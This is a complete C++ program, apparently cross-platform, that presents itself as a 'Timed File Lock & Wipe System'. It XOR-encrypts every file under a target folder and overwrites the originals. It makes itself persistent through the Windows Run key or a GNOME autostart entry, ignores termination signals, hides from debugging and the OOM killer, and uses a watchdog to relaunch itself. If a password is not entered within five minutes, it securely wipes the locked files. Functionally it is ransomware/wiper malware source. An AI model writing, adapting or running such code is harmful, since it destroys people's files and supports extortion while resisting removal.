/*Changlelog v1.3
the program runs, encrypt and decrypting the target files. But after decrypting succesfully, 
GNOME/X11/Wayland desktop managers crashing. After crash the system doesn't getting damaged and puts you in login screen.
*/
// winlock.cpp — Timed File Lock & Wipe System (Cleaned & Hardened)
#include <iostream>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <thread>
#include <string>
#include <iomanip>
#include <sstream>
#include <vector>
#include <algorithm>
#include <future>
#include <cstring>

#ifdef _WIN32
    #include <windows.h>
    #include <conio.h>
    #include <wincrypt.h>
    #include <winternl.h>
    #pragma comment(lib, "advapi32.lib")
    #pragma comment(lib, "crypt32.lib")
    #pragma comment(lib, "ntdll.lib")
#else
    #include <termios.h>
    #include <unistd.h>
    #include <sys/select.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <limits.h>
    #include <sys/file.h>
    #include <sys/resource.h>
    #include <sys/prctl.h>
#endif

namespace fs = std::filesystem;

// ==========================================
// Constants
// ==========================================
const std::string ADMIN_PASSWORD_HASH =
    "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9";

#ifdef _WIN32
const std::string TARGET_PATH = "C:\\Path_example";   // Windows için yol
#else
const std::string TARGET_PATH = "/home/path_example"; // Linux için doğrudan yol (veya tam yol örn: "/home/user/dummy")
#endif

const int         LOCK_DURATION_SECONDS = 300;
const std::string CRYPTO_KEY            = "Fast_XOR_Key_2026";
constexpr size_t  MAX_PASSWORD_LEN      = 128;

#ifdef _WIN32
const char* REG_APP_KEY = "Software\\TimedFileLock";
#else
const std::string CONFIG_DIR     = "./config";                // İsteğe bağlı manuel yol
const std::string CONFIG_FILE    = CONFIG_DIR + "/endtime";
const std::string AUTOSTART_FILE = "./autostart.desktop";
const std::string LOCK_FILE      = "./timedfilelock.pid";
#endif


// ── Global state ─────────────────────────────────────────────────────────
#ifdef _WIN32
static DWORD  g_watchdogPID      = 0;
static HANDLE g_hJob             = NULL;
static HANDLE g_hWatchdogProcess = NULL;
#else
static pid_t  g_watchdogPID = 0;
static int    g_lockFd      = -1;
#endif


// ── Windows Security & Mitigations ───────────────────────────────────────
#ifdef _WIN32
static bool enableSeDebugPrivilege() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp = {};
    LUID luid = {};
    bool ok = false;
    if (LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
    }
    CloseHandle(hToken);
    return ok;
}

static void applyProcessMitigations() {
    PROCESS_MITIGATION_DEP_POLICY dep = {};
    dep.Enable = 1; dep.Permanent = 1;
    SetProcessMitigationPolicy(ProcessDEPPolicy, &dep, sizeof(dep));

    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg = {};
    cfg.EnableControlFlowGuard = 1;
    SetProcessMitigationPolicy(ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg));

    PROCESS_MITIGATION_HEAP_TERMINATE_ON_CORRUPTION_POLICY heap = {};
    heap.HeapTerminateOnCorruption = 1;
    SetProcessMitigationPolicy(ProcessHeapTerminateOnCorruptionPolicy, &heap, sizeof(heap));

    PROCESS_MITIGATION_IMAGE_LOAD_POLICY img = {};
    img.NoRemoteImages = 1; img.NoLowMandatoryLabelImages = 1;
    SetProcessMitigationPolicy(ProcessImageLoadPolicy, &img, sizeof(img));

    PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY ext = {};
    ext.DisableExtensionPoints = 1;
    SetProcessMitigationPolicy(ProcessExtensionPointDisablePolicy, &ext, sizeof(ext));
}

static void createJobObject() {
    g_hJob = CreateJobObjectA(NULL, "TimedFileLock_Job");
    if (!g_hJob) return;

    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    SetInformationJobObject(g_hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));
    AssignProcessToJobObject(g_hJob, GetCurrentProcess());
}

static HANDLE createParentExitEvent() {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    return CreateEventA(&sa, TRUE, FALSE, NULL);
}
#endif


// ── Linux Security & Hardening ───────────────────────────────────────────
#ifndef _WIN32
static void hardenProcess() {
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);

    struct rlimit rl_core = {0, 0};
    setrlimit(RLIMIT_CORE, &rl_core);

    struct rlimit rl_nproc;
    if (getrlimit(RLIMIT_NPROC, &rl_nproc) == 0) {
        rl_nproc.rlim_cur = std::min(rl_nproc.rlim_max,
                                     (rlim_t)(std::thread::hardware_concurrency() * 4 + 16));
        setrlimit(RLIMIT_NPROC, &rl_nproc);
    }

    std::ofstream oom("/proc/self/oom_score_adj");
    if (oom) oom << "-1000\n";
}

static void installSignalHandlers() {
    struct sigaction sa = {};
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;

    sigaction(SIGINT,  &sa, nullptr);
    sigaction(SIGTERM, &sa, nullptr);
    sigaction(SIGHUP,  &sa, nullptr);
    sigaction(SIGQUIT, &sa, nullptr);
    sigaction(SIGPIPE, &sa, nullptr);
    sigaction(SIGUSR1, &sa, nullptr);
    sigaction(SIGUSR2, &sa, nullptr);
}
#endif


// ── Utility: Crypto & Security ───────────────────────────────────────────
bool timingSafeEqual(const std::string& a, const std::string& b) {
    if (a.size() != b.size()) return false;
    volatile int diff = 0;
    for (size_t i = 0; i < a.size(); ++i)
        diff |= (unsigned char)a[i] ^ (unsigned char)b[i];
    return diff == 0;
}

#ifdef _WIN32
std::string sha256Hex(const std::string& input) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::string result(64, '0');
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return result;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0); return result;
    }
    CryptHashData(hHash, (BYTE*)input.data(), (DWORD)input.size(), 0);
    BYTE hashBytes[32]; DWORD hashLen = 32;
    if (CryptGetHashParam(hHash, HP_HASHVAL, hashBytes, &hashLen, 0)) {
        std::ostringstream oss;
        for (int i = 0; i < 32; ++i)
            oss << std::hex << std::setw(2) << std::setfill('0') << (int)hashBytes[i];
        result = oss.str();
    }
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return result;
}
#else
static const uint32_t K[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,
    0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,
    0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,
    0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,
    0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,
    0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};
#define RR(x,n) (((x)>>(n))|((x)<<(32-(n))))
#define CH(x,y,z) (((x)&(y))^(~(x)&(z)))
#define MAJ(x,y,z) (((x)&(y))^((x)&(z))^((y)&(z)))
#define S0(x) (RR(x,2)^RR(x,13)^RR(x,22))
#define S1(x) (RR(x,6)^RR(x,11)^RR(x,25))
#define G0(x) (RR(x,7)^RR(x,18)^((x)>>3))
#define G1(x) (RR(x,17)^RR(x,19)^((x)>>10))

std::string sha256Hex(const std::string& msg) {
    uint32_t h[8] = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
                     0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};
    std::vector<uint8_t> data(msg.begin(), msg.end());
    uint64_t bitLen = (uint64_t)data.size() * 8;
    data.push_back(0x80);
    while (data.size() % 64 != 56) data.push_back(0);
    for (int i = 7; i >= 0; --i) data.push_back((uint8_t)(bitLen >> (i * 8)));

    for (size_t i = 0; i < data.size(); i += 64) {
        uint32_t w[64] = {};
        for (int j = 0; j < 16; ++j)
            w[j] = ((uint32_t)data[i+j*4]<<24)|((uint32_t)data[i+j*4+1]<<16)|
                   ((uint32_t)data[i+j*4+2]<<8)|(uint32_t)data[i+j*4+3];
        for (int j = 16; j < 64; ++j)
            w[j] = G1(w[j-2]) + w[j-7] + G0(w[j-15]) + w[j-16];
        uint32_t a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
        for (int j = 0; j < 64; ++j) {
            uint32_t t1 = hh + S1(e) + CH(e,f,g) + K[j] + w[j];
            uint32_t t2 = S0(a) + MAJ(a,b,c);
            hh=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
        }
        h[0]+=a; h[1]+=b; h[2]+=c; h[3]+=d;
        h[4]+=e; h[5]+=f; h[6]+=g; h[7]+=hh;
    }
    std::ostringstream oss;
    for (int i = 0; i < 8; ++i)
        oss << std::hex << std::setw(8) << std::setfill('0') << h[i];
    return oss.str();
}
#undef RR
#undef CH
#undef MAJ
#undef S0
#undef S1
#undef G0
#undef G1
#endif


// ── Single Instance & Terminal Control ───────────────────────────────────
#ifndef _WIN32
bool acquireSingleInstanceLock() {
    g_lockFd = open(LOCK_FILE.c_str(), O_CREAT | O_RDWR | O_CLOEXEC, 0600);
    if (g_lockFd < 0) return false;
    if (flock(g_lockFd, LOCK_EX | LOCK_NB) != 0) {
        close(g_lockFd); g_lockFd = -1; return false;
    }
    std::string pid = std::to_string(getpid()) + "\n";
    (void)ftruncate(g_lockFd, 0);
    (void)write(g_lockFd, pid.c_str(), pid.size());
    return true;
}

void releaseSingleInstanceLock() {
    if (g_lockFd >= 0) {
        flock(g_lockFd, LOCK_UN);
        close(g_lockFd);
        g_lockFd = -1;
        unlink(LOCK_FILE.c_str());
    }
}

static struct termios orig_termios;
static bool rawModeActive = false;

void disableRawMode() {
    if (rawModeActive) {
        tcsetattr(STDIN_FILENO, TCSAFLUSH, &orig_termios);
        rawModeActive = false;
    }
}

void enableRawMode() {
    tcgetattr(STDIN_FILENO, &orig_termios);
    atexit(disableRawMode);
    struct termios raw = orig_termios;
    raw.c_lflag &= ~(ECHO | ICANON | ISIG);
    raw.c_cc[VMIN] = 0; raw.c_cc[VTIME] = 0;
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &raw);
    rawModeActive = true;
}

bool kbhit() {
    fd_set fds; FD_ZERO(&fds); FD_SET(STDIN_FILENO, &fds);
    struct timeval tv = {0, 0};
    return select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) > 0;
}

int getch() {
    unsigned char c = 0;
    if (read(STDIN_FILENO, &c, 1) < 1) return -1;
    return c;
}
#endif

#ifdef _WIN32
void enableAnsiSupport() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return;
    DWORD mode = 0;
    GetConsoleMode(hOut, &mode);
    SetConsoleMode(hOut, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
}

BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
    switch (dwCtrlType) {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
            Sleep(INFINITE);
            return TRUE;
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT:
            Sleep(4500);
            return TRUE;
    }
    return FALSE;
}
#endif


// ── Watchdog Management ──────────────────────────────────────────────────
#ifdef _WIN32
void spawnWatchdog() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    HANDLE hEvent = createParentExitEvent();
    std::string eventHandleStr = (hEvent != NULL) ? std::to_string((uintptr_t)hEvent) : "0";

    std::string cmdLine = std::string("\"") + exePath + "\" --watchdog "
                          + std::to_string(GetCurrentProcessId()) + " " + eventHandleStr;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessA(exePath, const_cast<char*>(cmdLine.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return;

    g_watchdogPID = pi.dwProcessId;
    if (g_hJob) AssignProcessToJobObject(g_hJob, pi.hProcess);

    SetHandleInformation(pi.hProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
    g_hWatchdogProcess = pi.hProcess;
    CloseHandle(pi.hThread);
}
#else
void spawnWatchdog() {
    char exePath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len == -1) return;
    exePath[len] = '\0';
    std::string pidStr = std::to_string(getpid());

    pid_t pid = fork();
    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
        prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
        installSignalHandlers();

        int devnull = open("/dev/null", O_RDWR);
        if (devnull >= 0) {
            dup2(devnull, STDIN_FILENO);
            dup2(devnull, STDOUT_FILENO);
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }

        execl(exePath, exePath, "--watchdog", pidStr.c_str(), nullptr);
        _exit(1);
    }
    g_watchdogPID = pid;
}

void relaunchInTerminal(const char* exePath) {
    const char* terms[] = {"gnome-terminal", "xfce4-terminal", "konsole", "xterm", nullptr};
    for (int i = 0; terms[i]; ++i) {
        std::string cmd  = terms[i];
        std::string arg  = (cmd == "gnome-terminal") ? " -- " : " -e ";
        std::string full = cmd + arg + "\"" + exePath + "\" &";
        if (system(full.c_str()) == 0) return;
    }
}
#endif

void killWatchdog() {
#ifdef _WIN32
    if (g_watchdogPID != 0) {
        if (g_hWatchdogProcess != NULL) {
            SetHandleInformation(g_hWatchdogProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
            TerminateProcess(g_hWatchdogProcess, 0);
            CloseHandle(g_hWatchdogProcess);
            g_hWatchdogProcess = NULL;
        } else {
            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, g_watchdogPID);
            if (h) { TerminateProcess(h, 0); CloseHandle(h); }
        }
        g_watchdogPID = 0;
    }
    if (g_hJob) {
        CloseHandle(g_hJob);
        g_hJob = NULL;
    }
#else
    if (g_watchdogPID != 0) {
        kill(g_watchdogPID, SIGKILL);
        g_watchdogPID = 0;
    }
#endif
}


// ── Persistence & File Operations ────────────────────────────────────────
void setAutostartAndTimer(long long targetEndTime) {
#ifdef _WIN32
    HKEY hRunKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        RegSetValueExA(hRunKey, "TimedFileLockProgram", 0, REG_SZ, (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hRunKey);
    }
    HKEY hAppKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hAppKey, "EndTime", 0, REG_QWORD, (const BYTE*)&targetEndTime, sizeof(targetEndTime));
        RegCloseKey(hAppKey);
    }
#else
    fs::create_directories(CONFIG_DIR);
    std::ofstream f(CONFIG_FILE);
    if (f) f << targetEndTime;

    char exePath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len != -1) {
        exePath[len] = '\0';
        fs::create_directories(fs::path(AUTOSTART_FILE).parent_path());
        std::ofstream desktop(AUTOSTART_FILE);
        if (desktop)
            desktop << "[Desktop Entry]\nType=Application\nName=TimedFileLock\n"
                    << "Exec=" << exePath << "\nHidden=false\nNoDisplay=false\n"
                    << "X-GNOME-Autostart-enabled=true\n";
    }
#endif
}

void cleanSettings() {
#ifdef _WIN32
    HKEY hRunKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hRunKey, "TimedFileLockProgram");
        RegCloseKey(hRunKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, REG_APP_KEY);
#else
    std::error_code ec;
    fs::remove(CONFIG_FILE, ec);
    fs::remove(AUTOSTART_FILE, ec);
    if (fs::exists(CONFIG_DIR, ec) && fs::is_empty(CONFIG_DIR, ec))
        fs::remove(CONFIG_DIR, ec);
#endif
}

long long getSavedEndTime() {
#ifdef _WIN32
    HKEY hKey; long long endTime = 0; DWORD dataSize = sizeof(endTime);
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwType = 0;
        if (RegQueryValueExA(hKey, "EndTime", NULL, &dwType, (LPBYTE)&endTime, &dataSize) == ERROR_SUCCESS)
            if (dwType != REG_QWORD) endTime = 0;
        RegCloseKey(hKey);
    }
    return endTime;
#else
    std::ifstream f(CONFIG_FILE); long long endTime = 0;
    if (f) f >> endTime;
    return endTime;
#endif
}

bool secureDelete(const fs::path& filePath) {
    std::error_code ec;
    uintmax_t fileSize = fs::file_size(filePath, ec);
    if (!ec && fileSize > 0) {
        const unsigned char patterns[3] = {0x00, 0xFF, 0xA5};
        for (int pass = 0; pass < 3; ++pass) {
            std::ofstream file(filePath, std::ios::binary | std::ios::in | std::ios::out);
            if (!file.is_open()) break;
            constexpr size_t BLOCK_SIZE = 4096;
            std::vector<char> buf(BLOCK_SIZE, (char)patterns[pass]);
            uintmax_t written = 0;
            while (written < fileSize) {
                uintmax_t toWrite = std::min((uintmax_t)buf.size(), fileSize - written);
                file.write(buf.data(), (std::streamsize)toWrite);
                written += toWrite;
            }
            file.flush(); file.close();
        }
    }
    fs::remove(filePath, ec);
    return !ec;
}

void processSingleFile(const fs::path& filePath, bool encrypt) {
    fs::path newPath = filePath;
    if (encrypt) newPath += ".locked";
    else         newPath.replace_extension("");

    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return;

    std::ofstream outFile(newPath, std::ios::binary);
    if (!outFile) { inFile.close(); return; }

    constexpr size_t BUFFER_SIZE = 4 * 1024 * 1024;
    std::vector<char> buffer(BUFFER_SIZE);
    size_t keyIndex = 0;
    const size_t keySize = CRYPTO_KEY.size();

    while (inFile) {
        inFile.read(buffer.data(), BUFFER_SIZE);
        std::streamsize bytesRead = inFile.gcount();
        if (bytesRead == 0) break;
        for (std::streamsize i = 0; i < bytesRead; ++i) {
            buffer[i] ^= CRYPTO_KEY[keyIndex];
            if (++keyIndex >= keySize) keyIndex = 0;
        }
        outFile.write(buffer.data(), bytesRead);
        if (!outFile) {
            inFile.close(); outFile.close();
            fs::remove(newPath); return;
        }
    }
    outFile.flush();
    inFile.close(); outFile.close();
    secureDelete(filePath);
}

void processFiles(const fs::path& targetPath, bool encrypt) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return;

    auto options = fs::directory_options::skip_permission_denied;
    std::vector<fs::path> targetFiles;
    
    // 1. ADIM: Hedef dosyaları güvenli bir listede topla
    auto it  = fs::recursive_directory_iterator(targetPath, options, ec);
    auto end = fs::recursive_directory_iterator();

    while (it != end) {
        if (ec) { ec.clear(); it.increment(ec); continue; }
        try {
            const auto& entry = *it;
            if (entry.is_regular_file(ec) && !ec) {
                const auto currentPath = entry.path();
                bool isLocked = (currentPath.extension() == ".locked");
                if ((encrypt && !isLocked) || (!encrypt && isLocked)) {
                    targetFiles.push_back(currentPath);
                }
            }
        } catch (...) {}
        it.increment(ec);
    }

    if (targetFiles.empty()) return;

    // 2. ADIM: Thread patlamasını (Resource temporarily unavailable) önlemek için 
    // dosyaları güvenli bir döngüde sırayla (veya kontrollü) işle
    for (const auto& currentPath : targetFiles) {
        processSingleFile(currentPath, encrypt);
    }
}

void destroyLockedFiles(const fs::path& targetPath) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return;
    std::vector<fs::path> targets;
    for (const auto& entry : fs::recursive_directory_iterator(targetPath, ec)) {
        if (ec) { ec.clear(); continue; }
        if (!entry.is_regular_file()) continue;
        if (entry.path().extension() == ".locked")
            targets.push_back(entry.path());
    }
    for (const auto& path : targets) secureDelete(path);
}

bool hasLockedFiles(const fs::path& targetPath) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return false;
    for (const auto& entry : fs::recursive_directory_iterator(targetPath, ec)) {
        if (ec) { ec.clear(); continue; }
        if (!entry.is_regular_file()) continue;
        if (entry.path().extension() == ".locked") return true;
    }
    return false;
}


// ── Main Entry Point ──────────────────────────────────────────────────────
#ifdef _WIN32
int main() {
    enableAnsiSupport();
    enableSeDebugPrivilege();
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    if (__argc >= 3 && std::string(__argv[1]) == "--watchdog") {
        applyProcessMitigations();
        SetConsoleCtrlHandler(ConsoleHandler, TRUE);

        DWORD parentPID = std::stoul(__argv[2]);
        HANDLE hParent  = OpenProcess(SYNCHRONIZE, FALSE, parentPID);
        HANDLE hEvent   = (__argc >= 4) ? reinterpret_cast<HANDLE>(std::stoull(__argv[3])) : NULL;

        if (hParent) {
            HANDLE waitHandles[2] = { hParent, hEvent };
            DWORD  handleCount    = (hEvent != NULL) ? 2 : 1;
            WaitForMultipleObjects(handleCount, waitHandles, FALSE, INFINITE);
            CloseHandle(hParent);
        } else if (hEvent != NULL) {
            WaitForSingleObject(hEvent, INFINITE);
        } else {
            return 0;
        }

        HANDLE hMutex = CreateMutexA(NULL, TRUE, "TimedFileLock_Running");
        if (hMutex && GetLastError() != ERROR_ALREADY_EXISTS) {
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi = {};
            if (CreateProcessA(exePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                WaitForInputIdle(pi.hProcess, 2000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            ReleaseMutex(hMutex);
        }
        if (hMutex) CloseHandle(hMutex);
        return 0;
    }

    if (__argc == 2 && std::string(__argv[1]) == "--reset") {
        std::cout << "Resetting: decrypting files...\n";
        processFiles(TARGET_PATH, false);
        killWatchdog();
        cleanSettings();
        std::cout << "Done. Registry and autostart entry removed.\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return 0;
    }

    applyProcessMitigations();
    createJobObject();
#else
int main(int argc, char* argv[]) {
    if (argc == 3 && std::string(argv[1]) == "--watchdog") {
        prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
        prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
        installSignalHandlers();

        pid_t parentPID = static_cast<pid_t>(std::stoul(argv[2]));
        while (kill(parentPID, 0) == 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(500));

        char exePath[PATH_MAX];
        ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
        if (len != -1) {
            exePath[len] = '\0';
            int fd = open(LOCK_FILE.c_str(), O_CREAT | O_RDWR, 0600);
            if (fd >= 0) {
                if (flock(fd, LOCK_EX | LOCK_NB) == 0) {
                    flock(fd, LOCK_UN); close(fd);
                    relaunchInTerminal(exePath);
                } else {
                    close(fd);
                }
            }
        }
        return 0;
    }

    if (argc == 2 && std::string(argv[1]) == "--reset") {
        std::cout << "Resetting: decrypting files...\n";
        processFiles(TARGET_PATH, false);
        killWatchdog();
        cleanSettings();
        releaseSingleInstanceLock();
        std::cout << "Done. Config and autostart entry removed.\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return 0;
    }

    hardenProcess();
    installSignalHandlers();

    if (!acquireSingleInstanceLock()) {
        std::cerr << "Another instance is already running.\n";
        return 1;
    }
#endif

    spawnWatchdog();

    std::cout << "--- Timed File Lock System ---\n";

    long long now     = std::chrono::duration_cast<std::chrono::seconds>(
                            std::chrono::system_clock::now().time_since_epoch()).count();
    long long endTime = getSavedEndTime();

    if (endTime != 0 && !hasLockedFiles(TARGET_PATH)) {
        cleanSettings(); endTime = 0;
    }

    if (endTime == 0) {
        endTime = now + LOCK_DURATION_SECONDS;
        setAutostartAndTimer(endTime);
        processFiles(TARGET_PATH, true);
        std::cout << "Files locked and added to system startup!\n\n";
    } else {
        std::cout << "Previous locked session found, resuming...\n\n";
    }

    int remaining = static_cast<int>(endTime - now);
    if (remaining < 0) remaining = 0;

    std::string inputBuffer, statusMsg;
    bool isUnlocked = false;

#ifndef _WIN32
    enableRawMode();
#endif

    while (remaining > 0 && !isUnlocked) {
#ifdef _WIN32
        if (_kbhit()) { int ch = _getch();
#else
        if (kbhit())  { int ch = getch();
#endif
            if (ch == '\n' || ch == '\r') {
                if (timingSafeEqual(sha256Hex(inputBuffer), ADMIN_PASSWORD_HASH)) {
                    isUnlocked = true; break;
                } else {
                    statusMsg = " [!] Wrong password!"; inputBuffer.clear();
                }
            } else if (ch == 127 || ch == '\b') {
                if (!inputBuffer.empty()) inputBuffer.pop_back();
            } else if (ch >= 32 && ch <= 126 && inputBuffer.size() < MAX_PASSWORD_LEN) {
                inputBuffer += static_cast<char>(ch); statusMsg = "";
            }
        }

        now = std::chrono::duration_cast<std::chrono::seconds>(
                  std::chrono::system_clock::now().time_since_epoch()).count();
        remaining = static_cast<int>(endTime - now);
        if (remaining < 0) remaining = 0;

        int mins = remaining / 60, secs = remaining % 60;
        std::cout << "\r\033[K" << "Time left: "
                  << std::setfill('0') << std::setw(2) << mins << ":"
                  << std::setfill('0') << std::setw(2) << secs
                  << " | Password: " << std::string(inputBuffer.size(), '*')
                  << statusMsg << std::flush;

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

#ifndef _WIN32
    disableRawMode();
#endif

    if (isUnlocked) {
        std::cout << "\n\nUNLOCKING...\n";
        processFiles(TARGET_PATH, false);
        killWatchdog();
        cleanSettings();
#ifndef _WIN32
        releaseSingleInstanceLock();
#endif
        std::cout << "All files decrypted and system cleaned up!\n";
    } else {
        std::cout << "\n\nTIME IS UP! DESTROYING LOCKED FILES...\n";
        destroyLockedFiles(TARGET_PATH);
        killWatchdog();
        cleanSettings();
#ifndef _WIN32
        releaseSingleInstanceLock();
#endif
        std::cout << "All locked files permanently destroyed!\n";
    }

    std::this_thread::sleep_for(std::chrono::seconds(3));
    return 0;
}
